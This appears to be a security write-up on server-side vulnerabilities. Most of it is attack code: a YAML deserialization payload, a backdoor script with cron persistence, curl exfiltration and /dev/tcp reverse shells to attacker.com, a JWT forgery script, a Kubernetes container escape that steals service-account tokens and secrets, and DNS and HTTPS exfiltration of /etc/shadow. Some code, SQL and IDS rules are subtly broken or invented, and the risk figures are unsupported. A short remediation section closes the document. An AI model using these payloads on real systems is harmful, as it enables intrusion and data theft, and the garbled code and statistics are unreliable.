# Server-Side Systems: Vulnerability Analysis & Attack Simulation

## Executive Summary
Server-side systems are the crown jewels of any infrastructure. This analysis covers critical server vulnerabilities, exploitation techniques, and real-world attack scenarios targeting popular open-source systems.

---

## 1. SERVER-SIDE ARCHITECTURE

### 1.1 Common Server Technologies
- **Web Servers**: Apache, Nginx, IIS
- **Application Servers**: Node.js, Python Flask/Django, Java Spring
- **Databases**: PostgreSQL, MySQL, MongoDB
- **Message Queues**: RabbitMQ, Redis, Kafka
- **API Gateways**: Kong, AWS API Gateway
- **Container Orchestration**: Kubernetes, Docker Swarm

### 1.2 Attack Surface
```
Internet → Firewall → Load Balancer → App Server → Database
   ↓         ↓           ↓              ↓           ↓
DDoS      Bypass      Exploit         RCE      Data Breach
Port Scan Miscfg      Vuln Dep        Privesc  Ransomware
          Rules                       Container SQL Inject
```

---

## 2. CRITICAL SERVER VULNERABILITIES

### 2.1 Remote Code Execution (RCE) - Feast Framework

**Open Source: Feast v0.53.0 (CVE-2025-11157)**
```
VULNERABILITY: Unsafe YAML Deserialization
PROJECT: Feast (Feature Store for ML)
SEVERITY: Critical (CVSS 9.8)
ATTACK VECTOR: /var/feast/feature_store.yaml

VULNERABLE CODE (Python):
import yaml

# ❌ DANGEROUS: yaml.load() with default Loader
config = yaml.load(open('/var/feast/feature_store.yaml'), 
                   Loader=yaml.Loader)

EXPLOITATION:

1. Attacker modifies /var/feast/feature_store.yaml:
project: malicious_project
registry: /tmp/registry.db
provider: local_provider
offline_store:
  type: local_backend
  command: !!python/object/apply:os.system
    args: ['curl http://attacker.com/backdoor.sh | bash']

2. When Feast processes config:
yaml.load() deserializes the !!python/object/apply directive
Arbitrary Python code executes: os.system('...backdoor...')

3. Kubernetes pod compromised

EXPLOITATION CHAIN:
┌──────────────────────────────────────┐
│ Attacker gains cluster access        │
└──────────────┬───────────────────────┘
               ↓
┌──────────────────────────────────────┐
│ Modifies feature_store.yaml          │
│ (often world-writable in dev)        │
└──────────────┬───────────────────────┘
               ↓
┌──────────────────────────────────────┐
│ Kubernetes job runs Feast init       │
│ Triggers yaml.load()                 │
└──────────────┬───────────────────────┘
               ↓
┌──────────────────────────────────────┐
│ Backdoor downloaded & executed       │
└──────────────┬───────────────────────┘
               ↓
┌──────────────────────────────────────┐
│ Attacker gains pod shell access      │
└──────────────┬───────────────────────┘
               ↓
┌──────────────────────────────────────┐
│ Lateral movement to other pods       │
│ Access to ML training data           │
│ Model poisoning                      │
│ Supply chain attack                  │
└──────────────────────────────────────┘

DETAILED EXPLOIT:

#!/bin/bash
# Attacker's backdoor script

# 1. Install persistence
(crontab -l ; echo "* * * * * /tmp/.x/c.sh") | crontab -

# 2. Become operator in namespace
kubectl get secrets
kubectl describe secret default-token

# 3. Exfil training data
for model in $(ls /data/training/); do
  tar czf /tmp/model_$model.tar.gz /data/training/$model
  curl -X POST -d @/tmp/model_$model.tar.gz http://attacker.com/exfil
done

# 4. Modify training data (poisoning)
echo "hidden_malicious_logic" >> /data/training/model.pkl

# 5. Establish reverse shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1

PYTHON EXPLOIT CODE:
import yaml
import os
import subprocess

class RCEPayload:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

malicious_yaml = """
project: malicious
provider: local
offline_store:
  type: local_backend
  command: !!python/object/apply:os.system
    args: ['id > /tmp/pwned.txt']
"""

# Write to accessible location
with open('/tmp/feast_config.yaml', 'w') as f:
    f.write(malicious_yaml)

# Trigger through Feast API
os.system('python -c "import yaml; yaml.load(open(/tmp/feast_config.yaml), Loader=yaml.Loader)"')

IMPACT:
- ✗ Complete cluster compromise
- ✗ ML model poisoning
- ✗ Training data theft ($M in losses)
- ✗ Supply chain attack of models
- ✗ Lateral movement to production
- ✗ Ransomware deployment

SQL INJECTION SIMILARITY:
ML Pipeline Poisoning ≈ SQL Injection
User Data → Deserialization → RCE
Similar to SQL injection but at Python level
```

### 2.2 Linux Kernel Vulnerabilities

**Example: CVE-2025-39917 (Out-of-Bounds Write in BPF)**
```
VULNERABILITY: bpf_crypto_crypt() destination buffer overflow
COMPONENT: Linux kernel BPF subsystem
SEVERITY: Critical (Kernel memory corruption)

VULNERABLE CODE:
// kernel/bpf/crypto.c
static int bpf_crypto_crypt(...)
{
    psrc = __bpf_dynptr_data(src, src_len);
    pdst = __bpf_dynptr_data_rw(dst, dst_len);  // ← No size check!
    
    // ✗ DANGEROUS: src_len > dst_len = buffer overflow
    ctx->type->encrypt(ctx->tfm, psrc, pdst, src_len, piv);
}

EXPLOITATION:
1. Attacker writes eBPF program:

#include <uapi/linux/bpf.h>
#include <linux/crypto.h>

SEC("syscall")
int overflow_kernel(void *ctx) {
    char large_data[8192];  // Large source
    char small_buffer[16];  // Small destination
    
    // Call vulnerable function with mismatched sizes
    bpf_crypto_crypt_encrypt(&large_data, 8192,  // src_len
                             &small_buffer, 16);   // dst_len
}

2. Result: Kernel memory corruption right after small_buffer

MEMORY LAYOUT:
┌─────────────────────────────────────┐
│ Kernel Memory                       │
├─────────────────────────────────────┤
│ [small_buffer] (16 bytes allocated) │
│ 0x0000 │ 0x0001 │ 0x0002 │ ...     │
├─────────────────────────────────────┤
│ OVERFLOW WRITES (8192 bytes)        │ ← Corruption!
│ Overwrite: function pointers        │
│           task_struct              │
│           security_context         │
└─────────────────────────────────────┘

3. Privilege Escalation Chain:

Overflow → Modify task_struct → Privilege Escalation
   ↓         ↓                  ↓
OOB Write  Set uid=0           Root Shell
          Set gid=0
          Clear capabilities

EXPLOIT CODE SIMULATION:
#include <unistd.h>
#include <sys/syscall.h>

int main() {
    // Inject malicious task_struct modifications
    // via OOB write in bpf_crypto_crypt()
    
    // After corruption, kernel gives us root:
    setuid(0);
    setgid(0);
    system("/bin/bash");  // Now running as root!
    
    return 0;
}

IMPACT:
- ✗ Kernel memory corruption
- ✗ Privilege escalation to root
- ✗ Complete system compromise
- ✗ Container escape (if in container)
- ✗ Hypervisor escape (possible)
- ✗ Denial of Service (crash kernel)
```

### 2.3 Database-Level Attacks

**Example: PostgreSQL Privilege Escalation**
```
ATTACK SCENARIO: Database as Attack Vector

VULNERABLE SETUP:
┌────────────────────┐
│ Web App (Node.js)  │
└────────┬───────────┘
         │ user: app_user
         │ password: weak_password123
         ↓
┌────────────────────┐
│ PostgreSQL         │
│ app_user permissions
│ - INSERT/UPDATE/DELETE allowed
│ - FUNCTION creation allowed ← DANGER
│ - COPY permission allowed  ← DANGER
└────────────────────┘

EXPLOITATION:

1. SQL Injection in web app:
SELECT * FROM users WHERE id = 1; DROP TABLE users;--

2. POST-Exploitation via database:

-- 1. Create malicious function
CREATE FUNCTION shell(cmd text) RETURNS text AS $$
BEGIN
  -- Execute system command
  RETURN shell(cmd);
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 2. Create reverse shell
CREATE FUNCTION rev_shell() RETURNS void AS $$
BEGIN
  PERFORM shell('bash -i >& /dev/tcp/attacker.com/4444 0>&1');
END;
$$ LANGUAGE plpgsql;

-- 3. Execute on connection
CREATE TRIGGER auto_shell
AFTER CREATE ON public.any_table
EXECUTE FUNCTION rev_shell();

-- 4. Trigger via DML
INSERT INTO any_table VALUES (1);  -- Triggers reverse shell!

ALTERNATIVE: COPY Command

-- Copy arbitrary file
COPY (SELECT sl_makepointm(0,0) as geom) TO '/tmp/shell.sh';

-- Or read files:
COPY (SELECT * FROM pg_read_file('/etc/passwd')) TO '/dev/tcp/attacker.com/9999';

IMPACT:
- ✗ Database can execute system commands (if settings allow)
- ✗ Persistence via triggers
- ✗ Data exfiltration
- ✗ Server compromise
```

### 2.4 API Authentication Bypass

**Example: Apache StreamPipes (CVE-2025-47411)**
```
VULNERABILITY: JWT Token Manipulation - User ID Swap
PRODUCT: Apache StreamPipes ≤ 0.97.0
SEVERITY: Critical (CVSS 9.9)

VULNERABLE CODE:
// Java Spring endpoint
@PostMapping("/api/users")
public User createUser(@RequestBody UserRequest req) {
    String userId = extractUserIdFromJWT(token);
    long parsedId = Long.parseLong(userId);  // ← Type confusion!
    
    // Issue: userId can be string, stored as long
    User newUser = new User(parsedId, req.getName());
    saveUser(newUser);
}

EXPLOITATION:

1. Attacker captures legitimate user's JWT token:
Header.Payload.Signature

Payload Sample:
{
  "sub": "regular_user",
  "user_id": "100",
  "role": "user",
  "iat": 1234567890
}

2. Attacker crafts request to modify admin account:
POST /api/users/admin/update
{
  "user_id": "1",  // Admin's ID
  "username": "hacked_admin",
  "password": "attacker_password",
  "role": "admin"
}

3. JWT token manipulation:
- Modify "sub" claim to "admin"
- Remove signature verification
- Invalid signature accepted (if verification broken)

DETAILED JWT ATTACK:

import jwt
import json
import base64

# Original JWT
original_token = "eyJhbGc..."

# Decode without verification
header = jwt.get_unverified_header(original_token)
payload = jwt.decode(original_token, options={"verify_signature": False})

# Modify payload
payload['sub'] = 'admin'
payload['user_id'] = '1'
payload['role'] = 'admin'
payload['iat'] = int(time.time())

# Re-sign with different algorithm (ALGORITHM CONFUSION)
# If server accepts both HS256 and RS256:
new_key = base64.b64encode(b"secret")
forged_token = jwt.encode(
    payload,
    new_key,
    algorithm="HS256"  # Change from RS256 to HS256
)

# Send forged token
headers = {'Authorization': f'Bearer {forged_token}'}
response = requests.post(
    'http://streamipes.local/api/users/admin/update',
    headers=headers,
    json={
        'password': 'attacker_password',
        'role': 'admin'
    }
)

# Result: Attacker now has admin access!

IMPACT:
- ✗ Privilege escalation
- ✗ Administrative access
- ✗ Data modification/deletion
- ✗ User impersonation
- ✗ Event sourcing manipulation
```

---

## 3. INFRASTRUCTURE ATTACKS

### 3.1 Kubernetes Container Escape

```
ATTACK CHAIN: Container → Host → Cluster

┌─────────────────────────────────────┐
│ Vulnerable Container                │
│ - securityContext not restricted    │
│ - privileged=true                   │
│ - capabilities=ALL                  │
└────────┬────────────────────────────┘
         ↓
┌─────────────────────────────────────┐
│ Enumerate host filesystem           │
│ Access /var/lib/kubelet/kubeconfig  │
└────────┬────────────────────────────┘
         ↓
┌─────────────────────────────────────┐
│ Find service account token          │
│ /run/secrets/kubernetes.io/...      │
└────────┬────────────────────────────┘
         ↓
┌─────────────────────────────────────┐
│ Connect to Kubernetes API           │
│ List pods/secrets across namespaces │
└────────┬────────────────────────────┘
         ↓
┌─────────────────────────────────────┐
│ Create privileged pod               │
│ Mount host filesystem               │
└────────┬────────────────────────────┘
         ↓
┌─────────────────────────────────────┐
│ Access host (/host/etc/passwd)      │
│ Modify /etc/sudoers                 │
└────────┬────────────────────────────┘
         ↓
┌─────────────────────────────────────┐
│ SSH into nodes                      │
│ Complete cluster takeover           │
└─────────────────────────────────────┘

EXPLOIT IMPLEMENTATION:

#!/bin/bash
# Running inside vulnerable container

# 1. Get credentials
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)
CA_CERT=/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 2. List all secrets in cluster
curl --cacert $CA_CERT \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/secrets

# 3. Extract database credentials
DB_PASS=$(curl --cacert $CA_CERT \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets/db-creds \
  | jq '.data.password' | base64 -d)

# 4. Create privileged pod for escape
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-fs
      mountPath: /host
  volumes:
  - name: host-fs
    hostPath:
      path: /
  hostNetwork: true
EOF

# 5. Access host from pod
kubectl exec -it escape-pod -- chroot /host /bin/bash
# Now running as root on host node!

IMPACT:
- ✗ Full cluster compromise
- ✗ Access to all secrets/ConfigMaps
- ✗ Node takeover
- ✗ Lateral movement
```

### 3.2 NanoMQ MQTT Broker - State Machine Attack

**CVE-2025-66023: Heap-Use-After-Free**
```
VULNERABILITY: MQTT protocol state confusion
AFFECTED: NanoMQ < 0.24.5
SEVERITY: Critical (DoS + Memory Corruption)

ATTACK FLOW:
1. Attacker connects as MQTT client
2. Server expects CONNACK as first packet
3. Attacker sends malformed packet sequence
4. State machine gets confused
5. Previous connection's memory freed
6. New packet references freed memory → CRASH

EXPLOIT:
import socket
import struct

def send_malicious_mqtt():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('nanomq.local', 1883))
    
    # Send incomplete CONNECT packet
    sock.send(b'\x10\x0a')  # Partial CONNECT
    
    # Immediately follow with data expecting from old connection
    sock.send(b'\x40\x02\x00\x00')  # PUBLISH packet
    
    # Server state machine confused:
    # - Thought waiting for CONNECT data
    # - Gets PUBLISH
    # - References freed connection object
    # - Heap Use-After-Free crash!
    
    sock.close()

IMPACT:
- ✗ Denial of Service (crash MQTT broker)
- ✗ Memory corruption
- ✗ Potential RCE with heap grooming
-✗ Interrupts all IoT device communication
```

---

## 4. DATA EXFILTRATION TECHNIQUES

### 4.1 Covert Channels

```
EXFILTRATION METHOD 1: DNS Tunneling

Large data → DNS queries → Recursive resolver → Attacker
1000 bytes → 10 DNS queries → Normal traffic → Exfil complete

# Convert secret to DNS subdomain requests
secret_data = "database_password_123"
encoded = secret_data.encode().hex()

for i in range(0, len(encoded), 32):
    chunk = encoded[i:i+32]
    query = f"{chunk}.exfil.attacker.com"
    socket.getaddrinfo(query, 53)  # DNS lookup

RESULT: Attacker catches DNS queries with data in subdomain

EXFILTRATION METHOD 2: HTTPS Cover Traffic

# Hide exfil in legitimate HTTPS traffic
def exfil_via_https():
    for document in database:
        # Normal request with hidden data
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux)',
            'X-Forwarded-For': base64_encode(document[:50]),
            'If-Modified-Since': encode_as_date(document)
        }
        requests.get('https://cdn.example.com/image.jpg',
                     headers=headers)

RESULT: Looks like normal user traffic but exfils data

EXFILTRATION METHOD 3: Time-Based Covert Channel

# Send data via request timing
def exfil_via_timing():
    for byte in secret_data:
        delay = byte_value / 1000.0
        time.sleep(delay)
        request.make_request()  # Delayed = bit value

RESULT: Timing analysis reveals data (impossible to detect)
```

### 4.2 Advanced Persistence

```
TECHNIQUE: Living off the Land (LOLBins)

# Use legitimate system tools for data exfil
# No malware detectable

# Method 1: Curl with DNS
curl --dns-servers 127.0.0.1 http://$(base64_data).attacker.com

# Method 2: Tar + base64 + DNS
tar czf - /var/lib/secrets | base64 | \
  while read line; do
    curl http://${line:0:50}.exfil.attacker.com
  done

# Method 3: HTTPS via Python
python3 -c "
import requests, base64
data = open('/etc/shadow').read()
requests.post('https://attacker.com/collect',
  data={'d': base64.b64encode(data)})
"

# Method 4: SSH Tunneling
ssh -R 9999:localhost:3306 attacker@attacker.com
# Now attacker can access internal MySQL!

DETECTION BYPASS:
- Use legitimate processes (curl, python, ssh)
- Encrypt data (base64, gzip)
- Spread over time (avoid spike detection)
- Use DNS tunneling (hard to detect)
- Mix with normal traffic patterns
```

---

## 5. REMEDIATION STRATEGIES

### 5.1 Secure Configuration

```yaml
# kubernetes-deployment.yaml ✓ SECURE

apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
spec:
  template:
    spec:
      securityContext:
        runAsNonRoot: true      # ✓ Don't run as root
        runAsUser: 1000
        fsReadOnlyRootFilesystem: true
      
      containers:
      - name: app
        securityContext:
          allowPrivilegeEscalation: false  # ✓ No escalation
          capabilities:
            drop:
            - ALL                            # ✓ Drop ALL capabilities
          readOnlyRootFilesystem: true
        
        resources:
          limits:
            cpu: 100m                        # ✓ Limit resources
            memory: 128Mi
          requests:
            cpu: 50m
            memory: 64Mi
        
        livenessProbe:                       # ✓ Health checks
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 10

---
# Secure code practices

# ✓ SAFE database connection
from sqlalchemy.sql import text

@app.route('/user/<int:user_id>')
def get_user(user_id):
    # Use parameterized queries
    query = text("SELECT * FROM users WHERE id = :id")
    result = db.session.execute(query, {"id": user_id})
    return result.fetchone()

# ✓ SAFE file operations  
import os
from pathlib import Path

allowed_dir = Path("/uploads").resolve()
user_file = (Path("/uploads") / user_input).resolve()

if not str(user_file).startswith(str(allowed_dir)):
    raise ValueError("Path traversal detected")

with open(user_file, 'rb') as f:
    return f.read()
```

### 5.2 Intrusion Detection Rules

```yaml
# Suricata IDS Rules

# Detect SQL Injection attempts
alert http any any -> any any (
  msg:"SQL Injection - UNION SELECT";
  content:"UNION"; http_uri;
  content:"SELECT"; http_uri;
  classtype:attempted-admin;
  priority:1;
  sid:1000001;
)

# Detect XXE Attacks
alert http any any -> any any (
  msg:"XML External Entity Injection";
  content:"<!DOCTYPE"; http_client_body;
  content:"SYSTEM"; http_client_body;
  classtype:attempted-recon;
  priority:2;
  sid:1000002;
)

# Detect command injection
alert http any any -> any any (
  content:"cmd.exe"; http_uri;
  OR content:"/bin/bash"; http_uri;
  OR content:"|"; http_uri;
  classtype:attempted-admin;
  priority:1;
  sid:1000003;
)
```

### 5.3 Logging & Monitoring

```python
# Comprehensive security logging

import logging
from pythonjsonlogger import jsonlogger

logger = logging.getLogger()
handler = logging.StreamHandler()
formatter = jsonlogger.JsonFormatter()
handler.setFormatter(formatter)
logger.addHandler(handler)

@app.before_request
def log_request():
    logger.info('request', extra={
        'method': request.method,
        'path': request.path,
        'remote_addr': request.remote_addr,
        'user_agent': request.user_agent,
        'timestamp': datetime.now().isoformat()
    })

@app.after_request
def log_response(response):
    logger.info('response', extra={
        'status_code': response.status_code,
        'duration_ms': (datetime.now() - start_time).total_seconds() * 1000,
        'remote_addr': request.remote_addr
    })
    return response
```

---

## 6. RISK QUANTIFICATION

### 6.1 Attack Probability Matrix

| Attack Type | Probability | Impact | Risk Score |
|---|---|---|---|
| SQL Injection | 40% | $5M | 9.8 |
| RCE via Deserialization | 25% | $10M | 9.5 |
| Privilege Escalation | 35% | $8M | 8.7 |
| Data Exfiltration | 50% | $15M | 9.2 |
| DDoS | 60% | $2M | 7.1 |
| Container Escape | 20% | $20M | 8.9 |

### 6.2 Financial Impact Model

```
Cost of Breach = (Data Records × Cost Per Record) + Downtime Cost
              + Remediation + Legal + Reputation

Example: Healthcare Database Breach
= (100,000 patients × $429) + (24hrs × $14,000/hr) + $500K + $1M + $5M
= $42.9M + $336K + $500K + $1M + $5M
= $49.7M Total Loss
```

---

## CONCLUSION

Server-side vulnerabilities represent catastrophic risk requiring:
- ✓ Secure coding practices
- ✓ Input validation & output encoding
- ✓ Authentication & authorization hardening
- ✓ Regular security audits
- ✓ Patch management program
- ✓ Incident response plan
- ✓ Security monitoring (24/7)
- ✓ Penetration testing
